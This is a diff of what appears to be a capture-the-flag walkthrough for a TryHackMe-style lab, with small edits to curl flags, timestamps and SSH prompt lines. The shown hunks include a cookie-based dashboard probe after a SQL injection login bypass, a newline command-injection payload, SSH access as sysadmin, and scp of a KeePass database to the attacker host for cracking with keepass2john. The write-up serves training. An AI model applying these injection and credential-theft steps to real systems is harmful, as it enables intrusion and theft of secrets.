@@ -279,7 +279,7 @@ Date: Wed, 11 Nov 2026 12:21:55 GMT
 Inspect `/internal/dashboard` with the saved session cookie to discover sensitive information. The SQLi login bypass authenticated the session as `username=netops` with `role=operator`. The dashboard's audit logs identify three users: `admin`, `jmartin`, and `netops`. The logs suggest that `netops` was previously targeted by a successful SQLi attack. Subsequent entries indicate a possible command injection attempt against `/internal/health`, using the payload `127.0.0.1%0awhoami`, where `%0a` represents a URL-encoded newline character.
 
 ```html
-root@ip-ATTACKER_IP:~# curl -b cookies.txt -s http://TARGET_IP:5050/internal/dashboard | sed '/<style\b/,/<\/style>/d'
+root@ip-ATTACKER_IP:~# curl -b cookies.txt -sX GET http://TARGET_IP:5050/internal/dashboard | sed '/<style\b/,/<\/style>/d'
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -711,7 +711,7 @@ root@ip-ATTACKER_IP:~# curl -b cookies.txt -s http://TARGET_IP:5050/internal/das
 Inspect `/internal/health` to identify a potential newline-based command injection vulnerability in the `target` parameter of the connectivity verification form.
 
 ```html
-root@ip-ATTACKER_IP:~# curl -b cookies.txt -s http://TARGET_IP:5050/internal/health | sed '/<style\b/,/<\/style>/d'
+root@ip-ATTACKER_IP:~# curl -b cookies.txt -sX GET http://TARGET_IP:5050/internal/health | sed '/<style\b/,/<\/style>/d'
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1034,7 +1034,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1017-aws x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/pro
 
- System information as of Wed Nov 11 13:34:00 UTC 2026
+ System information as of 
 
   System load:  0.08               Processes:             105
   Usage of /:   26.1% of 19.31GB   Users logged in:       0
@@ -1055,7 +1055,7 @@ See https://ubuntu.com/esm or run: sudo pro status
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
-Last login: Tue May 19 03:18:19 2026 from 192.168.230.214
+Last login: 
 sysadmin@tryhackme-2204:~$ whoami
 sysadmin
 sysadmin@tryhackme-2204:~$ id
@@ -1094,11 +1094,6 @@ Download the database, crack it, and discover `username=root&password=S3cur3P4ss
 
 ```bash
 root@ip-ATTACKER_IP:~# scp sysadmin@TARGET_IP:/home/sysadmin/backups/infrastructure.kdbx /root/
-The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
-ED25519 key fingerprint is SHA256:mBtRlOiIk68jScmMRAikuHQ6lDotycO+zrqvQ5V5e70.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'TARGET_IP' (ED25519) to the list of known hosts.
 sysadmin@TARGET_IP's password: 
 infrastructure.kdbx                                                     100% 2439     1.7MB/s   00:00    
 root@ip-ATTACKER_IP:~# keepass2john infrastructure.kdbx > keepass.hash
